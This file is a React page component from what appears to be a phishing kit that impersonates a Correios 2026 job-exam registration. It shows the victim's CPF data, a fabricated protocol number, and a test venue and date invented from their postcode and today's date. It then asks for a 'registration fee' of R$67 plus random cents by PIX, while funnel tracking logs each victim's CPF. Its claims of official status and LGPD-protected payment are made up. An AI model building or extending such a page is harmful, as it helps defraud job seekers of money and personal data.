import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { saveSession, getSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const getProvaDate = () => {
  const d = new Date();
  d.setDate(d.getDate() + 45);
  return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
};

const getProvaHorario = () => "Portões: 12h00 — Início: 13h00 — Término: 17h00";

const DetalhesInscricao = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const cepData = location.state?.cepData || getSession()?.cepData;
  const agencyData = getSession()?.agencyData;
  const [centavos] = useState(() => Math.floor(Math.random() * 99) + 1);
  const valorInscricao = 67 + centavos / 100;
  const [provaDate] = useState(getProvaDate);
  const [protocolo] = useState(() => `COR-${Date.now().toString(36).toUpperCase()}-${Math.floor(Math.random() * 9000 + 1000)}`);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: "/detalhes-inscricao", cepData });
    trackFunnelEvent("detalhes-inscricao", { cpf: cpfData.cpf });
    window.scrollTo(0, 0);
  }, [cpfData, navigate]);

  const handlePagar = () => {
    navigate(buildUrlWithUtm("/pagamento"), {
      state: { cpfData, cepData, valorBeneficio: valorInscricao, protocolo },
    });
  };

  if (!cpfData) return null;

  const schoolName = agencyData?.name || (cepData ? `Escola Municipal de ${cepData.localidade}` : "Escola Municipal");
  const schoolAddress = agencyData?.endereco || (cepData ? `${cepData.localidade}/${cepData.uf}` : "—");
  const schoolCity = agencyData?.cidade || (cepData ? `${cepData.localidade}/${cepData.uf}` : "—");

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Atendente Comercial > Inscrição > Detalhes" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg">DETALHES DA INSCRIÇÃO — CONCURSO CORREIOS 2026</h1>

          <div className="bg-success/10 border border-success/30 rounded p-3 text-sm text-foreground">
            <span className="font-bold">Inscrição pré-confirmada.</span> Efetue o pagamento da taxa para garantir sua vaga.
          </div>

          {/* Protocolo */}
          <div className="rounded border border-border bg-muted/30 p-3 text-center">
            <p className="text-xs text-muted-foreground">Nº de Protocolo</p>
            <p className="text-base font-mono font-bold text-foreground tracking-wider">{protocolo}</p>
          </div>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Nome</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
              {cpfData.dataNascimento && (
                <tr><td className="font-semibold">Nascimento</td><td>{cpfData.dataNascimento}</td></tr>
              )}
              <tr><td className="font-semibold">Situação</td><td className="text-primary font-bold">Apto(a) para inscrição</td></tr>
            </tbody>
          </table>

          {/* Local de Prova */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Local de Prova Designado</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Escola</td><td>{schoolName}</td></tr>
              <tr><td className="font-semibold">Endereço</td><td>{schoolAddress}</td></tr>
              <tr><td className="font-semibold">Cidade</td><td>{schoolCity}</td></tr>
              <tr><td className="font-semibold">Data</td><td>{provaDate}</td></tr>
              <tr><td className="font-semibold">Horário</td><td>{getProvaHorario()}</td></tr>
              <tr><td className="font-semibold">Duração</td><td>4 horas</td></tr>
            </tbody>
          </table>

          {/* Sobre o concurso */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Informações do Concurso</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Cargo</td><td>Atendente Comercial — Nível Médio</td></tr>
              <tr><td className="font-semibold">Remuneração</td><td>R$ 5.724,23 + Benefícios</td></tr>
              <tr><td className="font-semibold">Vagas</td><td>15.153 em todo o Brasil</td></tr>
              <tr><td className="font-semibold">Banca</td><td>IBFC — Instituto Brasileiro de Formação e Capacitação</td></tr>
              <tr><td className="font-semibold">Edital</td><td>Nº 01/2026 — ECT</td></tr>
              <tr><td className="font-semibold">Regime</td><td>CLT — Empresa Brasileira de Correios e Telégrafos</td></tr>
            </tbody>
          </table>

          {/* O que levar */}
          <table className="tabela-zebra">
            <thead><tr><th>O que levar no dia da prova</th></tr></thead>
            <tbody>
              <tr><td>✔ Documento oficial com foto (RG, CNH ou Passaporte)</td></tr>
              <tr><td>✔ Comprovante de inscrição (este protocolo)</td></tr>
              <tr><td>✔ Caneta esferográfica de tinta preta em material transparente</td></tr>
              <tr><td>✔ Chegar com no mínimo 60 minutos de antecedência</td></tr>
            </tbody>
          </table>

          {/* Taxa */}
          <div className="rounded border-2 border-accent bg-accent/10 p-4 text-center space-y-1">
            <p className="text-sm font-semibold text-foreground">Taxa de Inscrição</p>
            <p className="text-3xl font-black text-primary">
              R$ {valorInscricao.toFixed(2).replace(".", ",")}
            </p>
            <p className="text-xs text-muted-foreground">Pagamento via PIX — confirmação imediata</p>
          </div>

          <Button onClick={handlePagar} className="w-full h-12 text-sm font-bold">
            PAGAR TAXA DE INSCRIÇÃO
          </Button>

          <p className="text-[10px] text-center text-muted-foreground">
            Pagamento seguro — Dados protegidos conforme LGPD (Lei nº 13.709/2018)
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default DetalhesInscricao;
